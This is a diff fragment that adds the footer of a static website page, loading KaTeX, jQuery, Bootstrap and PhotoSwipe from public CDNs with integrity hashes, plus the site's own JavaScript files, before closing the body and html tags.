+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+<script src="https://bzoltan1.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://bzoltan1.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
